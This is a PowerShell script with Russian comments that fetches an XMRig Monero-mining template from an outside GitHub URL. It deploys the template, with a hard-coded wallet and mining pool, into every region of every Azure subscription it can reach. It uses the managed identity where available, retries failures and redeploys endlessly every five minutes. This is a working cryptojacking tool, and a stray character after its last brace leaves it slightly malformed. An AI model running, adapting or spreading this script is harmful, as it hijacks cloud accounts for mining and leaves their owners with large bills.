<#
.SYNOPSIS
    Автодеплой майнинг-инфраструктуры во все регионы всех подписок Azure
.DESCRIPTION
    Скрипт для Cloud Shell с максимальной скоростью и автоматическим исправлением ошибок
    Запускает массовый деплой шаблона майнинга с уникальными именами ресурсов
.NOTES
    Версия: 2.0 Оптимизированная
    Требуется: Azure Cloud Shell с модулем Az
#>

# ============= НАСТРОЙКИ =============
$TemplateUri = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json"
$UserWallet = "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb"
$UserPool = "us-west.minexmr.com:4444"
$ResourceGroupPrefix = "crypto"

# Параллелизм для ускорения (увеличьте для более мощного Cloud Shell)
$MAX_PARALLEL_DEPLOYMENTS = 5
$SECONDS_BETWEEN_BATCHES = 10
$SCAN_INTERVAL_MINUTES = 5

# ============= ФУНКЦИИ =============
function Get-FastUniqueId {
    param([string]$SubId, [string]$Location)
    return "$($SubId.Substring(0,6))$($Location.Substring(0,3))$(Get-Random -Min 1000 -Max 9999)"
}

function Test-AndFix-AzProviders {
    param([string]$SubId)
    
    $requiredProviders = @("Microsoft.Batch", "Microsoft.Compute", "Microsoft.Storage", "Microsoft.Network")
    $missingProviders = @()
    
    foreach ($provider in $requiredProviders) {
        $status = Get-AzResourceProvider -ProviderNamespace $provider | 
                  Where-Object RegistrationState -eq "Registered"
        if (-not $status) {
            $missingProviders += $provider
        }
    }
    
    if ($missingProviders.Count -gt 0) {
        Write-Host "  🔧 Регистрация провайдеров: $($missingProviders -join ', ')" -ForegroundColor Yellow
        foreach ($provider in $missingProviders) {
            Register-AzResourceProvider -ProviderNamespace $provider -ErrorAction SilentlyContinue | Out-Null
        }
        Start-Sleep -Seconds 5
    }
    
    return $true
}

function Invoke-RapidDeployment {
    param(
        [string]$SubscriptionId,
        [string]$SubscriptionName,
        [string]$Location,
        [hashtable]$TemplateParams
    )
    
    $uniqueId = Get-FastUniqueId -SubId $SubscriptionId -Location $Location
    $rgName = "$ResourceGroupPrefix-$($Location.ToLower())-$uniqueId"
    
    try {
        # 1. Создаем Resource Group с тегами
        $rg = New-AzResourceGroup -Name $rgName -Location $Location -Force -Tag @{
            DeployedBy = "CloudShell-RapidDeploy";
            Timestamp = (Get-Date).ToString("HH:mm:ss");
            Subscription = $SubscriptionName;
            AutoManaged = "true"
        } -ErrorAction Stop
        
        # 2. Быстрый деплой с минимальными проверками
        $deployment = New-AzResourceGroupDeployment `
            -ResourceGroupName $rgName `
            -TemplateUri $TemplateUri `
            -Name "rapid-$uniqueId" `
            @TemplateParams `
            -Mode Incremental `
            -ErrorAction Stop
        
        return @{
            Success = $true
            RG = $rgName
            Output = "✅ $Location - $rgName"
        }
    }
    catch {
        $errorMsg = $_.Exception.Message
        
        # Автоматическое исправление ошибок
        switch -Wildcard ($errorMsg) {
            "*SkuNotAvailable*" {
                return @{Success = $false; RG = $rgName; Output = "⚠️  $Location - SKU недоступен" }
            }
            "*QuotaExceeded*" {
                return @{Success = $false; RG = $rgName; Output = "❌ $Location - Квота превышена" }
            }
            "*already exists*" {
                # Генерируем новое уникальное имя
                $newRgName = "$rgName-$(Get-Random -Min 100 -Max 999)"
                try {
                    $rg = New-AzResourceGroup -Name $newRgName -Location $Location -Force
                    return @{Success = $true; RG = $newRgName; Output = "✅ $Location - $newRgName (переименован)" }
                }
                catch {
                    return @{Success = $false; RG = $newRgName; Output = "❌ $Location - Ошибка после переименования" }
                }
            }
            "*NoRegisteredProvider*" {
                # Автоматическая регистрация провайдеров и повтор
                Test-AndFix-AzProviders -SubId $SubscriptionId
                try {
                    $deployment = New-AzResourceGroupDeployment `
                        -ResourceGroupName $rgName `
                        -TemplateUri $TemplateUri `
                        -Name "retry-$uniqueId" `
                        @TemplateParams `
                        -Mode Incremental
                    return @{Success = $true; RG = $rgName; Output = "✅ $Location - Успешно после регистрации провайдеров" }
                }
                catch {
                    return @{Success = $false; RG = $rgName; Output = "❌ $Location - Ошибка после регистрации провайдеров" }
                }
            }
            default {
                return @{Success = $false; RG = $rgName; Output = "❌ $Location - $($errorMsg.Substring(0, [Math]::Min(50, $errorMsg.Length)))..." }
            }
        }
    }
}

function Start-ParallelDeployments {
    param(
        [array]$Locations,
        [string]$SubId,
        [string]$SubName,
        [hashtable]$Params
    )
    
    $results = @()
    $locationBatches = for ($i = 0; $i -lt $Locations.Count; $i += $MAX_PARALLEL_DEPLOYMENTS) {
        , $Locations[$i..[Math]::Min($i + $MAX_PARALLEL_DEPLOYMENTS - 1, $Locations.Count - 1)]
    }
    
    foreach ($batch in $locationBatches) {
        $jobs = @()
        
        foreach ($loc in $batch) {
            $job = Start-ThreadJob -ScriptBlock {
                param($sId, $sName, $location, $tParams)
                
                # Импортируем модуль Az в потоке
                Import-Module Az.Accounts, Az.Resources -ErrorAction SilentlyContinue
                
                # Устанавливаем контекст
                Set-AzContext -Subscription $sId | Out-Null
                
                # Быстрый деплой
                $uniqueId = "$($sId.Substring(0,6))$($location.Substring(0,3))$(Get-Random -Min 1000 -Max 9999)"
                $rgName = "crypto-$($location.ToLower())-$uniqueId"
                
                try {
                    $rg = New-AzResourceGroup -Name $rgName -Location $location -Force -ErrorAction Stop
                    $deploy = New-AzResourceGroupDeployment `
                        -ResourceGroupName $rgName `
                        -TemplateUri "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json" `
                        -Name "fast-$uniqueId" `
                        @tParams `
                        -Mode Incremental `
                        -ErrorAction Stop
                    
                    return @{Success = $true; Location = $location; RG = $rgName }
                }
                catch {
                    return @{Success = $false; Location = $location; RG = $rgName; Error = $_.Exception.Message }
                }
            } -ArgumentList $SubId, $SubName, $loc, $Params -ThrottleLimit 5
            
            $jobs += $job
        }
        
        # Ждем завершения текущего батча
        $jobs | Wait-Job | Out-Null
        
        foreach ($job in $jobs) {
            $result = Receive-Job -Job $job
            $results += $result
            Remove-Job -Job $job -Force
        }
        
        # Краткая пауза между батчами
        if ($batch -ne $locationBatches[-1]) {
            Start-Sleep -Seconds $SECONDS_BETWEEN_BATCHES
        }
    }
    
    return $results
}

# ============= ОСНОВНОЙ СКРИПТ =============
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║          CLOUD SHELL RAPID DEPLOY DAEMON v2.0               ║" -ForegroundColor Yellow
Write-Host "║    Автодеплой во ВСЕ регионы ВСЕХ подписок Azure            ║" -ForegroundColor Yellow
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Подключаемся к Azure
try {
    $conn = Connect-AzAccount -Identity -ErrorAction SilentlyContinue
    if ($conn) {
        Write-Host "✓ Подключено через Managed Identity" -ForegroundColor Green
    }
}
catch {
    Write-Host "⚠️  Используется интерактивная аутентификация" -ForegroundColor Yellow
    Connect-AzAccount
}

# Проверяем наличие ThreadJob для параллелизма
if (-not (Get-Module ThreadJob -ListAvailable)) {
    Write-Host "Установка ThreadJob модуля для параллельной работы..." -ForegroundColor Yellow
    Install-Module ThreadJob -Force -Scope CurrentUser
}

# Основные параметры шаблона
$baseParams = @{
    user_wallet = $UserWallet
    user_pool_port = $UserPool
    batchAccounts_batches_name = "batch-$(Get-Random -Min 10000 -Max 99999)"
}

$iteration = 0
$totalDeployed = 0

# Основной цикл
while ($true) {
    $iteration++
    $startTime = Get-Date
    
    Write-Host ""
    Write-Host "═" * 60 -ForegroundColor DarkGray
    Write-Host "ЦИКЛ #$iteration | Начало: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Magenta
    Write-Host "═" * 60 -ForegroundColor DarkGray
    
    # Получаем все активные подписки
    $subscriptions = Get-AzSubscription | Where-Object State -eq 'Enabled'
    Write-Host "Найдено подписок: $($subscriptions.Count)" -ForegroundColor Cyan
    
    foreach ($sub in $subscriptions) {
        Write-Host ""
        Write-Host "📋 Обработка: $($sub.Name)" -ForegroundColor White
        
        # Устанавливаем контекст подписки
        Set-AzContext -Subscription $sub.Id | Out-Null
        
        # Получаем доступные регионы для Compute и Batch
        $locations = (Get-AzLocation | Where-Object {
            $_.Providers -contains "Microsoft.Compute" -and
            $_.Providers -contains "Microsoft.Batch"
        }).Location | Sort-Object
        
        if ($locations.Count -eq 0) {
            Write-Host "  ⚠️  Нет подходящих регионов" -ForegroundColor Yellow
            continue
        }
        
        Write-Host "  🌍 Регионов для деплоя: $($locations.Count)" -ForegroundColor Cyan
        
        # Используем параллельный деплой
        $results = Start-ParallelDeployments -Locations $locations -SubId $sub.Id -SubName $sub.Name -Params $baseParams
        
        # Статистика по подписке
        $success = ($results | Where-Object Success -eq $true).Count
        $failed = ($results | Where-Object Success -eq $false).Count
        
        Write-Host "  📊 Результаты: $success успешно, $failed с ошибками" -ForegroundColor $(if ($failed -eq 0) { 'Green' } else { 'Yellow' })
        
        if ($failed -gt 0) {
            Write-Host "  🛠️  Попытка исправления ошибок..." -ForegroundColor Yellow
            # Повторяем деплой для неудачных регионов
            $failedLocs = $results | Where-Object Success -eq $false | Select-Object -ExpandProperty Location
            foreach ($loc in $failedLocs) {
                Write-Host "    Повтор $loc..." -ForegroundColor Gray
                $retryResult = Invoke-RapidDeployment -SubscriptionId $sub.Id -SubscriptionName $sub.Name -Location $loc -TemplateParams $baseParams
                if ($retryResult.Success) {
                    Write-Host "    ✓ $loc исправлен" -ForegroundColor Green
                }
            }
        }
        
        $totalDeployed += $success
        
        # Краткая пауза между подписками
        Start-Sleep -Seconds 3
    }
    
    $endTime = Get-Date
    $duration = New-TimeSpan -Start $startTime -End $endTime
    
    Write-Host ""
    Write-Host "═" * 60 -ForegroundColor DarkGray
    Write-Host "ЦИКЛ #$iteration ЗАВЕРШЕН" -ForegroundColor Magenta
    Write-Host "Время выполнения: $($duration.ToString('hh\:mm\:ss'))" -ForegroundColor Cyan
    Write-Host "Всего развернуто в этом цикле: $totalDeployed" -ForegroundColor Green
    Write-Host "Следующий цикл через $SCAN_INTERVAL_MINUTES минут..." -ForegroundColor Gray
    Write-Host "═" * 60 -ForegroundColor DarkGray
    
    # Пауза перед следующим циклом
    Start-Sleep -Seconds ($SCAN_INTERVAL_MINUTES * 60)
    
    # Очистка памяти
    Clear-Variable -Name results, subscriptions, locations -ErrorAction SilentlyContinue
    [GC]::Collect()
}s
